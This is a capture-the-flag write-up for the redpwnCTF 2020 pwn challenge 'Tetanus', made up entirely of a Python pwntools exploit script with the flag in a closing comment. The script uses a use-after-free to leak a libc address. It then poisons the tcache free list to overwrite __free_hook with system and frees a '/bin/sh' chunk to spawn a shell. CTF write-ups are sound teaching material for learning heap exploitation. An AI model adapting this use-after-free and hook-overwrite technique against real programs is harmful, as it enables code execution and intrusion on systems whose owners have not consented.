# Tetanus
pwn, 492

```python
from pwn import *


#p = remote("2020.redpwnc.tf", 31069)
p = process("./tetanus")
e = ELF("./tetanus")
libc = ELF("./libc.so.6")

#context.log_level = "debug"

#gdb.attach(p)


def alloc(size):
	print("alloc")
	p.recvuntil("> ")
	p.sendline("1")
	p.sendlineafter("> ", str(size))

def free(idx):
	print("free")
	p.recvuntil("> ")
	p.sendline("2")
	p.sendlineafter("> ", str(idx))


def edit(idx, el_idx, data=0x69696969):
	print("edit")
	p.recvuntil("> ")
	p.sendline("3")
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(el_idx))
	p.sendlineafter("> ", str(data))


def append(idx, *args):
	print("append")
	p.recvuntil("> ")
	p.sendline("5")
	#print(args)
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(len(args)))
	for i in args:
		print(i)
		p.recvuntil("> ")
		p.sendline(str(i))



def show(idx, el):
	print("show")
	p.recvuntil("> ")
	p.sendline("6")
	p.sendlineafter("> ", str(idx))
	p.sendlineafter("> ", str(el))


alloc(0x404)	# c0
append(0,0x1234)
free(0)
show(0, 0)

libc_leak = int(p.recvline().split()[-1].strip())
print("libc leak", hex(libc_leak))

libc.address = libc_leak - 0x1eabe0

binsh = 0x68732f6e69622f

print("libc address", hex(libc.address))
print("libc __free_hook", hex(libc.sym["__free_hook"]))
#print("libc __malloc_hook", hex(libc.sym["__malloc_hook"]))
print("libc system", hex(libc.sym["system"]))

#one_gadget = libc.address + 0x10afa9
#print("libc one_gadget", hex(one_gadget))

alloc(0x69)	# c1
alloc(0x69)	# c2
append(1, 0x4141)
free(2)
free(1)
edit(1, 0, libc.sym["__free_hook"])

alloc(0x69)	# c3
alloc(0x69)	# c4, this the chunk w/ pointer to where we want to write


# -- This one spawns a shell for you by calling __free_hook with /bin/sh as the memory being freed --
#append(4, libc.sym["system"])

alloc(0x10)
append(5, u64("/bin/sh;"))
free(5)

# -- This one spawns a shell for you by utilizing the fact that rust mallocs and frees input, which in this case is the string "/bin/sh" --
#append(4, libc.sym["system"])
#p.recvuntil("> ")
#p.sendline("/bin/sh")

p.interactive()		#flag{w0w_wh0da_thunk_th4t_unsafe_means_unsafe_ls!}
```
